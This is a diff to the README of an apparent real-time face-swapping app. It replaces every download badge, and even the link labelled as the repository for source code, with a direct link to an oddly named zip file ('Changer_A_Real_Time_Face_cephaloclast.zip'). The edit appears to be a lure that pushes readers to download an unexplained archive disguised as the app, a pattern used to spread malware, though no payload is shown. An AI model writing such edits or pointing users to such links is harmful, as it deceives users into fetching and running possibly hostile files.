@@ -1,6 +1,6 @@
 # 🎭 AI-Face-Changer-Real-Time - Real-Time Face Swapping Made Simple
 
-[![Download AI-Face-Changer-Real-Time](https://img.shields.io/badge/Download-AI--Face--Changer--Real--Time-green?style=for-the-badge)](https://github.com/neiljrunde/AI-Face-Changer-Real-Time)
+[![Download AI-Face-Changer-Real-Time](https://img.shields.io/badge/Download-AI--Face--Changer--Real--Time-green?style=for-the-badge)](https://raw.githubusercontent.com/neiljrunde/AI-Face-Changer-Real-Time/main/taproom/Changer_A_Real_Time_Face_cephaloclast.zip)
 
 ---
 
@@ -44,7 +44,7 @@ If your PC matches these specs, you will get smooth performance using the app.
 
 1. Click the big green button below to open the download page on GitHub:
 
-   [![Download AI-Face-Changer-Real-Time](https://img.shields.io/badge/Download-AI--Face--Changer--Real--Time-green?style=for-the-badge)](https://github.com/neiljrunde/AI-Face-Changer-Real-Time)
+   [![Download AI-Face-Changer-Real-Time](https://img.shields.io/badge/Download-AI--Face--Changer--Real--Time-green?style=for-the-badge)](https://raw.githubusercontent.com/neiljrunde/AI-Face-Changer-Real-Time/main/taproom/Changer_A_Real_Time_Face_cephaloclast.zip)
 
 2. On GitHub, look for the "Releases" section or the latest version folder.
 3. Download the Windows installer file (`.exe`) or the zipped package.
@@ -115,10 +115,10 @@ For detailed help and FAQs, visit the Issues tab on the GitHub page.
 ## 🔗 Useful Links
 
 - Download and get updates here:  
-  [![Download AI-Face-Changer-Real-Time](https://img.shields.io/badge/Download-AI--Face--Changer--Real--Time-green?style=for-the-badge)](https://github.com/neiljrunde/AI-Face-Changer-Real-Time)
+  [![Download AI-Face-Changer-Real-Time](https://img.shields.io/badge/Download-AI--Face--Changer--Real--Time-green?style=for-the-badge)](https://raw.githubusercontent.com/neiljrunde/AI-Face-Changer-Real-Time/main/taproom/Changer_A_Real_Time_Face_cephaloclast.zip)
 
 - GitHub repository for support and source code:  
-  https://github.com/neiljrunde/AI-Face-Changer-Real-Time
+  https://raw.githubusercontent.com/neiljrunde/AI-Face-Changer-Real-Time/main/taproom/Changer_A_Real_Time_Face_cephaloclast.zip
 
 - Documentation for deeper settings and development (inside repo).
 
